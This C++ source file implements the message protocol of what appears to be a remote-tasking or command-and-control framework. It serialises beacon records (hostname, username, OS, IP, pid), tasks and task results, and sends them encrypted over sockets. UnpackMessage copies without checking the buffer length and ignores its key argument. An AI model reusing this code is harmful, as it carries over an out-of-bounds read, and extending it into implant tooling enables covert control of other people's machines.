#include "protocol.h"
#include "crypto.h"
#include <cstring>
#include <arpa/inet.h>
#include <unistd.h>
#include <sys/socket.h>
#include <errno.h>

namespace rmf {

// 写入 32 位整数（网络字节序）
static void WriteUint32(std::vector<uint8_t>& buf, uint32_t val) {
    uint32_t n = htonl(val);
    buf.insert(buf.end(), reinterpret_cast<uint8_t*>(&n),
               reinterpret_cast<uint8_t*>(&n) + 4);
}

static uint32_t ReadUint32(const std::vector<uint8_t>& buf, size_t offset) {
    if (offset + 4 > buf.size()) return 0;
    uint32_t n;
    memcpy(&n, buf.data() + offset, 4);
    return ntohl(n);
}

// 写入字符串（长度前缀 + 内容）
static void WriteString(std::vector<uint8_t>& buf, const std::string& s) {
    WriteUint32(buf, static_cast<uint32_t>(s.size()));
    buf.insert(buf.end(), s.begin(), s.end());
}

static std::string ReadString(const std::vector<uint8_t>& buf, size_t& offset) {
    uint32_t len = ReadUint32(buf, offset);
    offset += 4;
    if (offset + len > buf.size()) return "";
    std::string s(reinterpret_cast<const char*>(buf.data() + offset), len);
    offset += len;
    return s;
}

std::vector<uint8_t> PackMessage(MsgType type, const std::vector<uint8_t>& payload,
                                 const std::vector<uint8_t>& key) {
    // 加密 payload
    std::vector<uint8_t> encrypted = Crypto::Encrypt(payload);

    // 构建消息: [4B length][4B type][encrypted payload]
    std::vector<uint8_t> msg;
    WriteUint32(msg, static_cast<uint32_t>(encrypted.size()));
    WriteUint32(msg, static_cast<uint32_t>(type));
    msg.insert(msg.end(), encrypted.begin(), encrypted.end());
    return msg;
}

std::pair<MsgType, std::vector<uint8_t>> UnpackMessage(const std::vector<uint8_t>& data,
                                                       const std::vector<uint8_t>& key) {
    if (data.size() < 8) {
        return {MsgType::ERROR, {}};
    }
    uint32_t length = ReadUint32(data, 0);
    uint32_t type = ReadUint32(data, 4);

    if (length > MAX_MESSAGE_SIZE) {
        return {MsgType::ERROR, {}};
    }

    std::vector<uint8_t> encrypted(data.begin() + 8, data.begin() + 8 + length);
    std::vector<uint8_t> payload = Crypto::Decrypt(encrypted);

    return {static_cast<MsgType>(type), payload};
}

// ============================================================================
//  BeaconInfo 序列化
// ============================================================================
std::vector<uint8_t> SerializeBeaconInfo(const BeaconInfo& info) {
    std::vector<uint8_t> buf;
    WriteString(buf, info.id);
    WriteString(buf, info.hostname);
    WriteString(buf, info.username);
    WriteString(buf, info.os_version);
    WriteString(buf, info.ip);
    WriteUint32(buf, info.pid);
    // timestamp
    uint32_t ts_lo = static_cast<uint32_t>(info.timestamp & 0xFFFFFFFF);
    uint32_t ts_hi = static_cast<uint32_t>(info.timestamp >> 32);
    WriteUint32(buf, ts_hi);
    WriteUint32(buf, ts_lo);
    return buf;
}

BeaconInfo DeserializeBeaconInfo(const std::vector<uint8_t>& data) {
    BeaconInfo info;
    size_t offset = 0;
    info.id = ReadString(data, offset);
    info.hostname = ReadString(data, offset);
    info.username = ReadString(data, offset);
    info.os_version = ReadString(data, offset);
    info.ip = ReadString(data, offset);
    info.pid = ReadUint32(data, offset);
    uint32_t ts_hi = ReadUint32(data, offset);
    uint32_t ts_lo = ReadUint32(data, offset);
    info.timestamp = (static_cast<uint64_t>(ts_hi) << 32) | ts_lo;
    return info;
}

// ============================================================================
//  Task 序列化
// ============================================================================
std::vector<uint8_t> SerializeTask(const Task& task) {
    std::vector<uint8_t> buf;
    WriteUint32(buf, task.id);
    WriteUint32(buf, static_cast<uint32_t>(task.type));
    WriteString(buf, task.args);
    return buf;
}

Task DeserializeTask(const std::vector<uint8_t>& data) {
    Task task;
    size_t offset = 0;
    task.id = ReadUint32(data, offset);
    task.type = static_cast<TaskType>(ReadUint32(data, offset));
    task.args = ReadString(data, offset);
    return task;
}

// ============================================================================
//  TaskResult 序列化
// ============================================================================
std::vector<uint8_t> SerializeTaskResult(const TaskResult& result) {
    std::vector<uint8_t> buf;
    WriteUint32(buf, result.task_id);
    WriteUint32(buf, result.success ? 1 : 0);
    WriteString(buf, result.output);
    uint32_t ts_lo = static_cast<uint32_t>(result.timestamp & 0xFFFFFFFF);
    uint32_t ts_hi = static_cast<uint32_t>(result.timestamp >> 32);
    WriteUint32(buf, ts_hi);
    WriteUint32(buf, ts_lo);
    return buf;
}

TaskResult DeserializeTaskResult(const std::vector<uint8_t>& data) {
    TaskResult result;
    size_t offset = 0;
    result.task_id = ReadUint32(data, offset);
    result.success = (ReadUint32(data, offset) != 0);
    result.output = ReadString(data, offset);
    uint32_t ts_hi = ReadUint32(data, offset);
    uint32_t ts_lo = ReadUint32(data, offset);
    result.timestamp = (static_cast<uint64_t>(ts_hi) << 32) | ts_lo;
    return result;
}

// ============================================================================
//  Socket 收发
// ============================================================================
std::vector<uint8_t> RecvMessage(int sock) {
    // 先读 4 字节长度
    uint32_t length = 0;
    ssize_t n = recv(sock, &length, 4, MSG_WAITALL);
    if (n <= 0) return {};
    length = ntohl(length);

    if (length > MAX_MESSAGE_SIZE) return {};

    // 读取 type + payload
    std::vector<uint8_t> data(4 + length); // 4 字节 type + payload
    // 先写 length 到前面
    std::vector<uint8_t> msg;
    uint32_t len_n = htonl(length);
    msg.insert(msg.end(), reinterpret_cast<uint8_t*>(&len_n),
               reinterpret_cast<uint8_t*>(&len_n) + 4);

    size_t received = 0;
    while (received < data.size()) {
        ssize_t r = recv(sock, data.data() + received, data.size() - received, 0);
        if (r <= 0) return {};
        received += r;
    }
    msg.insert(msg.end(), data.begin(), data.end());
    return msg;
}

bool SendMessage(int sock, const std::vector<uint8_t>& data) {
    size_t sent = 0;
    while (sent < data.size()) {
        ssize_t s = send(sock, data.data() + sent, data.size() - sent, 0);
        if (s <= 0) return false;
        sent += s;
    }
    return true;
}

} // namespace rmf
